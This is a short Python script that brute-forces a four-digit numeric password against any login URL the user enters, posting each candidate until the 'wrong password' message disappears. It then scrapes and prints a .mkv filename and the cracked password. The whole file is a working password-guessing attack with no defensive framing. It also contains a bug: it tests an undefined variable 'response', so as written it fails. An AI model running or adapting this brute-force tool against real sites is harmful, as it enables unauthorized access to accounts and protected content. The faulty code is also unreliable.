import requests
from bs4 import BeautifulSoup

# Set the login site URL
login_url = input("Enter link address:  ")
password_field = 'pssw'

x = 0
y = 10000

for password in range(x, y):
    r = requests.post(login_url, data={password_field: str(password)})
    # Check if login succeeded by inspecting the response text or status code
    if "you have entered a wrong password" not in response.text:
        soup = BeautifulSoup(r.content, 'html.parser')
        movie_title = soup.findAll('td')[1].text
        movie_title = movie_title.split('.mkv')[0] + '.mkv'
        print(movie_title)
        print(f"Password found: {password}")
        break
else:
    print("Password not found in the range", x, "and", y)     
